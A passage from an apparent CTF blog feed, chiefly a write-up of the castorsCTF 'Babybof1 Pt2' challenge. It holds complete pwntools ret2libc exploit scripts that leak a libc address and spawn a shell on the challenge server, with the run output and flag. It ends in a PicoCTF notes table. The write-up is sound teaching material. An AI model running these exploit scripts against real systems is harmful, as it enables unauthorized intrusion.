Running the code just 4 times is able to produce the whole flag since the jump offset is constant at 75, which means that after we execute the 1st block, we&rsquo;ll loop to the beginning.</p>
<p>Runnning the above code on the actual challenge works and gives us the real flag.</p>
]]></content>
        </item>
        
        <item>
            <title>CTF Writeup: Babybof1 Pt2</title>
            <link>/posts/castorsctf-babybof1pt2/</link>
            <pubDate>Mon, 15 Jun 2020 20:58:24 -0400</pubDate>
            
            <guid>/posts/castorsctf-babybof1pt2/</guid>
            <description>The Problem Description: Ghidra Decompilation: As we can see from the above decompilation, the vulnerability in the program is gets().
The call to gets() doesn&amp;rsquo;t check to make sure our input will fit into the buffer we give it,
so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.
The gets() means we the input can contain any character, even \x00, except for newlines.</description>
            <content type="html"><![CDATA[<h2 id="the-problem-description">The Problem Description:</h2>
<p><img src="/problem.png" alt="Problem Description"></p>
<h2 id="ghidra-decompilation">Ghidra Decompilation:</h2>
<p><img src="/ghidra.png" alt="Ghidra"></p>
<p>As we can see from the above decompilation, the vulnerability in the program is <code>gets()</code>.<br>
The call to gets() doesn&rsquo;t check to make sure our input will fit into the buffer we give it,<br>
so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.<br>
The gets() means we the input can contain any character, even \x00, except for newlines.</p>
<p>Let&rsquo;s check what kind of binary we have and what protections it has.</p>
<pre><code class="language-console" data-lang="console">$ wget https://castorsctf20.ctfd.io/files/10d1b0797feecefc95e7660be8bbbab4/babybof?token=eyJ1c2VyX2lkIjo3MzMsInRlYW1faWQiOjMyMSwiZmlsZV9pZCI6MTExfQ.XtPiqA.baXDvvhSBLjPBNCcxZqEx05bqY8 -O bof
$ file bof
bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,  
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,  
BuildID[sha1]=53082227c9e25222032055ccb700576121bd384f, not stripped
$ checksec --file=bof
[*] 'bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

</code></pre><p>The binary is a 64 bit ELF binary.</p>
<ul>
<li>Partial RELRO (Relocation Read-Only): PLT GOT entries are still writeable.</li>
<li>No canary: We can safely overwrite the saved return address without worrying about overwriting a stack canary.</li>
<li>NX disabled: The stack is executable, so we could use shellcode if we wanted.</li>
<li>No PIE: No ASLR in the binary itself, so addresses of functions like main will remain constant. However, the actual machine we run the binary on still will probably have ASLR enabled which means the stack addresses will change.</li>
</ul>
<p>First I tried using shellcode, but since ASLR is still enabled on the machine, the stack addresses will be randomized.<br>
This means that the address of the input buffer will change. I didn&rsquo;t know how to overwrite the return address with the correct address of the shellcode, so I just decided to use ret2libc. (Note: I think using shellcode was the intended solution and not ret2libc).<br>
Libc is a standard C library with all sort of useful functions. A ret2libc attack can take advantage of functions like system() in libc to spawn a shell.</p>
<p>The first step is to determine how much input we need to overwrite the return address.<br>
The stack should look like this for main().</p>
<pre><code>[    Saved Return Address   ]
[ Saved Frame Pointer (EBP) ]
[         Buffer[255]       ]
[         Buffer[254]       ]
[         Buffer[253]       ]
       . . . . . . . . 
[         Buffer[2]         ]
[         Buffer[1]         ]
[         Buffer[0]         ]

</code></pre><p>We want to write past the buffer, overwrite the saved fram pointer, and then overwrite the saved return address our own address to our exploit.<br>
We know that the buffer is 256 bytes from Ghidra, so we can use the following to test how much padding we need until we overwrite the return address.<br>
In the diagram above, writing to buffer will make input go &ldquo;up&rdquo; the stack.</p>
<pre><code class="language-console" data-lang="console">$ python -c 'print &quot;A&quot;*256 + &quot;B&quot;*8 + &quot;C&quot;*8 + &quot;D&quot;*8 + &quot;E&quot;*8' &gt; /tmp/asdf # Saves output to a file
$ gdb ./bof
(gdb) r &lt; /tmp/asdf # Runs with contents of asdf as the input 
Welcome to the cybercastors Babybof

Program received signal SIGSEGV, Segmentation fault.
0x000000000040078b in main ()
(gdb) x/i $rip
=&gt; 0x40078b &lt;main+62&gt;:	req 
</code></pre><p>We receive a segfault when we the binary with our input. It seems we stop at the ret instruction in main.<br>
A ret instruction is like pop rip, so let&rsquo;s what the ret instruction was trying to get from the stack.</p>
<pre><code class="language-console" data-lang="console">(gdb) x/gx $rsp
0x7fffffffdee8:	0x4343434343434343
</code></pre><p>It looks like the program was trying to return to the address <code>0x4343434343434343</code> which is probably why we got a segfault.<br>
Since 0x43 is an ascii C, we know that the stack will look like this after gets() is called:</p>
<pre><code>[ Saved ret   CCCCCCCC        ]
[ Saved EBP   BBBBBBBB        ]
[ Buffer:     A*256           ]
</code></pre><p>Now we just have to replace CCCCCCCC with the address of our exploit. We&rsquo;ll use a ROP (Return Oriented Programming) Chain to accomplish this.</p>
<h2 id="ret2libc">Ret2libc</h2>
<p>I used <a href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/">this</a> as a template for my 64-bit ret2libc attacks. Check the post out since it explains the basics of ret2libc pretty well.</p>
<h3 id="leak-libc">Leak Libc</h3>
<p>First we need to leak a libc function address. ASLR is enabled on the machine, so the address of libc functions will be randomized. In order to know the address of system() and other libc functions, we need to first find the base address of libc.<br>
We can use puts or printf to leak the address of a libc function. Puts is easier to use though, so we&rsquo;ll use that in this challenge.<br>
We&rsquo;ll be leaking the address of the <code>__libc_start_main</code> function and then subtracting the offset to calculate the base of libc. Then using the base of libc we can calculate where system() and the &ldquo;/bin/sh&rdquo; string is.</p>
<p>Here&rsquo;s our ROP chain:</p>
<pre><code>[Address of pop rdi, ret] [Address of __libc_start_main entry] [Address of puts] 
</code></pre><p>64-bit calling conventions say that the first argument of a function should be in the rdi register.<br>
So our rop chain will put the address of the <code>__libc_start_main</code> entry into rdi and then call puts, printing out the address of <code>__libc_start_main</code>.</p>
<p>This is what the stack will look with our ROP chain:</p>
<pre><code>[         Address of puts          ] 
[Address of __libc_start_main entry]
[      Address of pop rdi, ret     ]  
[      Buffer:     A*256           ]
</code></pre><p>Here&rsquo;s our script to leak <code>__libc_start_main</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34; The following script was based heavily on the script provided in the following url &#34;&#34;&#34;</span>
<span style="color:#e6db74">&#34;&#34;&#34;           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              &#34;&#34;&#34;</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chals20.cybercastors.com&#34;</span>, <span style="color:#ae81ff">14425</span>) <span style="color:#75715e"># Connect to the remote server</span>
<span style="color:#75715e">#p = process(&#34;./bof&#34;) # start the vuln binary</span>
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof&#34;</span>) <span style="color:#75715e"># Extract data from binary</span>
rop <span style="color:#f92672">=</span> ROP(elf) <span style="color:#75715e"># Find ROP gadgets</span>

<span style="color:#75715e"># Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget</span>
PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
RET <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>]

log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@plt: &#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__libc_start_main: &#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;pop rdi gadget: &#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))

base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
<span style="color:#75715e"># Create rop chain</span>
rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span>  p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS)

<span style="color:#75715e">#Send our rop-chain payload</span>
p<span style="color:#f92672">.</span>sendline(rop)

<span style="color:#75715e">#Parse leaked address</span>
<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvline())
<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name: &#34;</span>))
received <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
received <span style="color:#f92672">=</span> received<span style="color:#f92672">.</span>strip()
<span style="color:#66d9ef">print</span>(received)
leak <span style="color:#f92672">=</span> u64(received<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))

p<span style="color:#f92672">.</span>close()
</code></pre></div><p>Let&rsquo;s run the script:</p>
<pre><code class="language-console" data-lang="console">$ python3 leak.py
[+] Opening connection to chals20.cybercastors.com on port 14425: Done
[*] 'bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loaded 14 cached gadgets for './bof'
[*] puts@plt: 0x400590
[*] __libc_start_main: 0x600ff0
[*] pop rdi gadget: 0x4007f3
b'Welcome to the cybercastors Babybof\n'
b'Say your name: '
b'\xc0?m \xd7\x7f'
[*] Leaked libc address,  __libc_start_main: 0x7fd7206d3fc0
[*] Closed connection to chals20.cybercastors.com port 14425
</code></pre><p>We see that for this particular run, the address of <code>__libc_start_main</code> was 0x7fd7206d3fc0.<br>
We need to find out what version of libc is running on the server since different versions have different offsets between the base and functions.</p>
<p>Luckily there&rsquo;s a tool that finds the right libc version for you based on the address of a libc function.</p>
<p>Download the database and tools <a href="https://github.com/niklasb/libc-database">here</a> and then run the following:</p>
<pre><code class="language-console" data-lang="console">$ ./find __libc_start_main 0x7fd7206d3fc0 
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb (id libc6_2.31-0ubuntu9_amd64)
</code></pre><p>This shows us that the server was using the libc6_2.31-0ubuntu9_amd64 version. We can use <code>download libc6_2.31-0ubuntu9_amd64</code> to download that libc version.</p>
<p>Note: There is also an online libc database at <a href="https://libc.blukat.me/,">https://libc.blukat.me/,</a> but it only works sometimes since its database probably isn&rsquo;t as comphrehensive.</p>
<h3 id="exploit">Exploit</h3>
<p>We can use the pwntools python library to find libc offsets.</p>
<p>This calculates the base libc address by subtracting the offset from __libc_start_main</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>]
</code></pre></div><p>Then by using this libc base address we can find the addresses of system() and &ldquo;/bin/sh&rdquo; to spawn a shell.<br>
Using pwntools:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">BINSH <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)) <span style="color:#75715e">#Verify with find /bin/sh</span>
SYSTEM <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]
</code></pre></div><p>For our exploit, we need to be able to call main() twice: once to leak libc and another time to call system().<br>
We can just append the address of main() to our first ROP chain to accomplish this.</p>
<p>First ROP chain:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS) <span style="color:#f92672">+</span> p64(MAIN)
</code></pre></div><p>Then our second rop chain will call system:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rop2 <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(RET) <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(BINSH) <span style="color:#f92672">+</span> p64(SYSTEM)
</code></pre></div><p>Combine the above into a script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34; The following script was based heavily on the script provided in the following url &#34;&#34;&#34;</span>
<span style="color:#e6db74">&#34;&#34;&#34;           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              &#34;&#34;&#34;</span>

<span style="color:#75715e">#!/usr/bin/python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>

p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chals20.cybercastors.com&#34;</span>, <span style="color:#ae81ff">14425</span>)
<span style="color:#75715e">#p = process(&#34;./bof&#34;) # start the vuln binary</span>
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof&#34;</span>) <span style="color:#75715e"># Extract data from binary</span>
rop <span style="color:#f92672">=</span> ROP(elf) <span style="color:#75715e"># Find ROP gadgets</span>
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)

<span style="color:#75715e"># Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget</span>
PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
RET <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>]

log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@plt: &#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__libc_start_main: &#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;pop rdi gadget: &#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))

base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
<span style="color:#75715e"># Create rop chain</span>
rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS) <span style="color:#f92672">+</span> p64(MAIN)

<span style="color:#75715e">#Send our rop-chain payload</span>
p<span style="color:#f92672">.</span>sendline(rop)

<span style="color:#75715e">#Parse leaked address</span>
<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvline())
<span style="color:#66d9ef">print</span>(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name: &#34;</span>))
received <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
received <span style="color:#f92672">=</span> received<span style="color:#f92672">.</span>strip()
<span style="color:#66d9ef">print</span>(received)
leak <span style="color:#f92672">=</span> u64(received<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))

libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>]
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Address of libc </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(libc<span style="color:#f92672">.</span>address))

BINSH <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)) <span style="color:#75715e">#Verify with find /bin/sh</span>
SYSTEM <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]

log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;bin/sh </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(BINSH))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(SYSTEM))

rop2 <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(RET) <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(BINSH) <span style="color:#f92672">+</span> p64(SYSTEM)
p<span style="color:#f92672">.</span>sendline(rop2)
p<span style="color:#f92672">.</span>interactive()
p<span style="color:#f92672">.</span>close()
</code></pre></div><p>Run the script:</p>
<pre><code class="language-console" data-lang="console">$ python3 exploit.py
[+] Opening connection to chals20.cybercastors.com on port 14425: Done
[*] '/home/user/castorsctf/babybof1pt2/bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loaded 14 cached gadgets for './bof'
[*] '/home/user/castorsctf/babybof1pt2/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts@plt: 0x400590
[*] __libc_start_main: 0x600ff0
[*] pop rdi gadget: 0x4007f3
b'Welcome to the cybercastors Babybof\n'
b'Say your name: '
b'\xc0\xef\xe2\xa4o\x7f'
[*] Leaked libc address,  __libc_start_main: 0x7f6fa4e2efc0
[*] Address of libc 0x7f6fa4e08000 
[*] bin/sh 0x7f6fa4fbf5aa 
[*] system 0x7f6fa4e5d410 
[*] Switching to interactive mode
Welcome to the cybercastors Babybof
Say your name: /bin/sh: 0: can't access tty; job control turned off
$ $ ls
babybof  flag.txt  shell_flag.txt
$ $ cat shell_flag.txt
castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
$ $  
</code></pre><p>Note: during the actual ctf, there was a weird buffering issue, so I had to run exploit_buf.py around 100 times to get a shell.<br>
Towards the end of the ctf, the organizers fixed the buffering issue, so running exploit.py just once will now work.</p>
<p>Also if you see any inaccuracies anywhere, feel free to <a href="mailto:jacobshin313@gmail.com">contact</a> me!</p>
]]></content>
        </item>
        
        <item>
            <title>Notes: Gynvael&#39;s Hacking Livestreams for PicoCTF Challenges</title>
            <link>/posts/picoctf-stream-notes/</link>
            <pubDate>Wed, 13 May 2020 20:58:24 -0400</pubDate>
            
            <guid>/posts/picoctf-stream-notes/</guid>
            <description>Table of Contents    Title Category Points Link to Gynvael&amp;rsquo;s Stream     The Factory’s Secret  General 1    Glory of the Garden  Forensics 50 Part 1 (33:36)   Insp3ct0r  Web 50 Part 1 (39:47)   Let&amp;rsquo;s Warm Up  General 50 Part 1 (48:19)   The Numbers  Crypto 50 Part 1 (50:26)   Warmed Up  General 50 Part 1 (1:00:06)   2Warm  General 50 Part 1 (1:02:06)   handy-shellcode  Binary 50 Part 1 (1:05:30)   practice-run-1  Binary 50 Part 1 (1:26:18)   unzip  Forensics 50 Part 1 (1:27:46)   vault-door-training  Reversing 50 Part 1 (1:30:02)   13  Crypto 100 Part 1 (1:35:57)   Bases  General 100 Part 1 (1:38:50)   Easy1  Crypto 100 Part 1 (1:47:50)   First Grep  General 100 Part 1 (1:56:28)   OverFlow 0  Binary 100 Part 1 (1:57:06)   Resources  General 100 Part 1 (2:00:53)   caesar  Crypto 100 Part 1 (2:01:28)   dont-use-client-side  Web 100 Part 1 (2:02:40)   logon  Web 100 Part 1 (2:05:42)   strings it  General 100 Part 1 (2:11:07)   vault-door-1  Reversing 100 Part 1 (2:13:31)   what&amp;rsquo;s a net cat  General 100 Part 1 (2:29:37)   where are the robots  Web 100 Part 1 (2:31:33)   OverFlow 1  Binary 150 Part 1 (2:33:56)   So Meta  Forensics 150 Part 1 (2:44:34)   What Lies Within  Forensics 150 Part 1 (2:46:30)   Extensions  Forensics 150 Part 1 (3:08:03)   shark on the wire 1  Forensics 150 Part 1 (3:10:03)   Based  General 200 Part 1 (3:20:40)   Client-side-again  Web 200 Part 1 (3:25:29)   First Grep: Part II  General 200 Part 1 (3:36:48)   Flags  Crypto 200 Part 1 (3:38:22)   Mr-Worldwide  Crypto 200 Part 1 (3:44:54)   Open-to-admins  Web 200 Part 1 (4:05:34)   Tapping  Crypto 200 Part 1 (4:21:28)   la cifra de  Crypto 200 Part 1 (4:23:14)   picobrowser  Web 200 Part 2 (22:42)   plumbing  General 200 Part 2 (29:03)   rsa-pop-quiz  Crypto 200 Part 2 (30:11)   slippery-shellcode  Binary 200 Part 2 (51:31)   vault-door-3  Reversing 200 Part 2 (1:16:40)   whats-the-difference  General 200 Part 2 (1:34:10)   where-is-the-file  General 200 Part 2 (1:39:58)   WhitePages  Forensics 250 Part 2 (1:41:20)   c0rrupt  Forensics 250 Part 2 (1:51:03)   m00nwalk  Forensics 250 Part 2 (2:03:55)   OverFlow 2  Binary 250 Part 3 (17:33)   NewOverFlow-1  Binary 200 Part 3 (32:17)   like1000  Forensics 250 Part 3 (1:14:51)   vault-door-4  Reversing 250 Part 3 (1:32:45)   Irish-Name-Repo 1  Web 300 Part 3 (1:38:26)   flag_shop  General 300 Part 3 (1:48:23)   asm1  Reversing 200 Part 3 (2:02:44)   New Overflow-2  Binary 250 Part 4 (25:45)   asm2  Reversing 250 Part 4 (52:41)   CanaRy  Binary 300 Part 4 (1:07:25)   Investigative Reversing 0  Forensics 300 Part 4 (1:57:03)   asm3  Reversing 300 Part 5 (35:12)   miniRSA  Crypto 300 Part 5 (1:01:08)   mus1c  General 300 Part 5 (1:17:45)   shark on the wire 2  Forensics 300 Part 5 (1:29:57)   leap-frog  Binary 300 Part 6 (31:24)   reverse_cipher  Reversing 300 Part 6 (1:00:27)   stringzz  Binary 300 Part 6 (1:13:13)   Investigative Reversing 1  Forensics 350 Part 6 (1:30:43)   pastaAAA  Forensics 350 Part 6 (1:43:42)    Note: If you&amp;rsquo;re following along with your own picoctf account and solving challenges, not all values in the writeups will be the same as yours.</description>
            <content type="html"><![CDATA[<h2 id="table-of-contents">Table of Contents</h2>
<table>
<thead>
<tr>
<th>Title</th>
<th>Category</th>
<th>Points</th>
<th>Link to Gynvael&rsquo;s Stream</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="#the-factorys-secret---general-skills">The Factory’s Secret        </a></td>
<td>General</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td><a href="#glory-of-the-garden---forensics">Glory of the Garden         </a></td>
<td>Forensics</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=33m36s">Part 1 (33:36)</a></td>
</tr>
<tr>
<td><a href="#insp3ct0r---web-exploitation">Insp3ct0r                   </a></td>
<td>Web</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=39m47s">Part 1 (39:47)</a></td>
</tr>
<tr>
<td><a href="#lets-warm-up---general-skills">Let&rsquo;s Warm Up               </a></td>
<td>General</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=48m19s">Part 1 (48:19)</a></td>
</tr>
<tr>
<td><a href="#the-numbers---cryptography">The Numbers                 </a></td>
<td>Crypto</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=50m26s">Part 1 (50:26)</a></td>
</tr>
<tr>
<td><a href="#warmed-up---general-skills">Warmed Up                   </a></td>
<td>General</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h00m06s">Part 1 (1:00:06)</a></td>
</tr>
<tr>
<td><a href="#2warm---general-skills">2Warm                       </a></td>
<td>General</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h02m06s">Part 1 (1:02:06)</a></td>
</tr>
<tr>
<td><a href="#handy-shellcode---binary-exploitation">handy-shellcode             </a></td>
<td>Binary</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h05m30s">Part 1 (1:05:30)</a></td>
</tr>
<tr>
<td><a href="#practice-run-1---binary-exploitation">practice-run-1              </a></td>
<td>Binary</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h26m18s">Part 1 (1:26:18)</a></td>
</tr>
<tr>
<td><a href="#unzip---forensics">unzip                       </a></td>
<td>Forensics</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h27m46s">Part 1 (1:27:46)</a></td>
</tr>
<tr>
<td><a href="#vault-door-training---reverse-engineering">vault-door-training         </a></td>
<td>Reversing</td>
<td>50</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h30m02s">Part 1 (1:30:02)</a></td>
</tr>
<tr>
<td><a href="#13---cryptography">13                          </a></td>
<td>Crypto</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h35m57s">Part 1 (1:35:57)</a></td>
</tr>
<tr>
<td><a href="#bases---general-skills">Bases                       </a></td>
<td>General</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h38m50s">Part 1 (1:38:50)</a></td>
</tr>
<tr>
<td><a href="#easy1---cryptography">Easy1                       </a></td>
<td>Crypto</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h47m50s">Part 1 (1:47:50)</a></td>
</tr>
<tr>
<td><a href="#first-grep---general-skills">First Grep                  </a></td>
<td>General</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h56m28s">Part 1 (1:56:28)</a></td>
</tr>
<tr>
<td><a href="#overflow-0---binary-exploitation">OverFlow 0                  </a></td>
<td>Binary</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=1h57m06s">Part 1 (1:57:06)</a></td>
</tr>
<tr>
<td><a href="#resources---general-skills">Resources                   </a></td>
<td>General</td>
<td>100</td>
<td><a href="https://youtu.be/pYrGJuOUG7M?t=2h00m53s">Part 1 (2:00:53)</a></td>
</tr>
<tr>
<td><a href="#caesar----cryptography">caesar                      </a></td>
<td>Crypto</td>
<td>100</td>
